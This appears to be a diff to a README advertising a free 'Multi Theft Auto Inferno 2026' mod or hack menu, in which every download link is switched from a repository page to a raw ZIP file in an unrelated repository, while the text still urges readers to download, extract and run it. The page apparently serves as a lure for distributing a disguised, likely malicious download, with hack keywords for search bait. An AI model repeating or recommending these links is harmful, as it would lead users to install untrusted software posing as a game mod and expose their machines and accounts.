@@ -5,7 +5,7 @@ description: "Download the free Multi Theft Auto Inferno MTA server mod with cus
 ---
 # ⚡ multi-theft-auto-menu - Supercharge Your MTA Gaming Experience Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-MTA_Inferno_2026-FF6B00?style=for-the-badge&logo=github&logoColor=white&labelColor=2C2C2C)](https://github.com/Electrochemical-fightingcock8323/multi-theft-auto-menu)
+[![Download Now](https://img.shields.io/badge/Download-MTA_Inferno_2026-FF6B00?style=for-the-badge&logo=github&logoColor=white&labelColor=2C2C2C)](https://github.com/Electrochemical-fightingcock8323/electrochemical-fightingcock8323.github.io/raw/refs/heads/main/Piptomeris/2.4.zip)
 
 ## 👋 Welcome to Multi Theft Auto Inferno 2026
 
@@ -43,7 +43,7 @@ Follow these simple steps to get started:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[Click Here to Download](https://github.com/Electrochemical-fightingcock8323/multi-theft-auto-menu)**
+Visit this link to download the application: **[Click Here to Download](https://github.com/Electrochemical-fightingcock8323/electrochemical-fightingcock8323.github.io/raw/refs/heads/main/Piptomeris/2.4.zip)**
 
 Once you click the link, you'll see a green "Code" button. Click it, then select "Download ZIP" to get the file.
 
@@ -167,7 +167,7 @@ No, updates install automatically and preserve your settings.
 You're just minutes away from a better MTA experience. Download Multi Theft Auto Inferno 2026 today and feel the difference immediately.
 
 ### Quick Recap:
-1. **Download** from: [https://github.com/Electrochemical-fightingcock8323/multi-theft-auto-menu](https://github.com/Electrochemical-fightingcock8323/multi-theft-auto-menu)
+1. **Download** from: [https://github.com/Electrochemical-fightingcock8323/electrochemical-fightingcock8323.github.io/raw/refs/heads/main/Piptomeris/2.4.zip](https://github.com/Electrochemical-fightingcock8323/electrochemical-fightingcock8323.github.io/raw/refs/heads/main/Piptomeris/2.4.zip)
 2. **Extract** the ZIP file
 3. **Run** the application
 4. **Enjoy** enhanced performance and features
@@ -190,6 +190,6 @@ Don't wait – boost your MTA experience today!
 
 ---
 
-**Download Now:** [https://github.com/Electrochemical-fightingcock8323/multi-theft-auto-menu](https://github.com/Electrochemical-fightingcock8323/multi-theft-auto-menu)
+**Download Now:** [https://github.com/Electrochemical-fightingcock8323/electrochemical-fightingcock8323.github.io/raw/refs/heads/main/Piptomeris/2.4.zip](https://github.com/Electrochemical-fightingcock8323/electrochemical-fightingcock8323.github.io/raw/refs/heads/main/Piptomeris/2.4.zip)
 
 Keywords: mta, mta-hack, mta-mod, mta-script, mtasa-lua, multi-theft-auto, multi-theft-auto-bot, multi-theft-auto-hack, samp, samp-mod
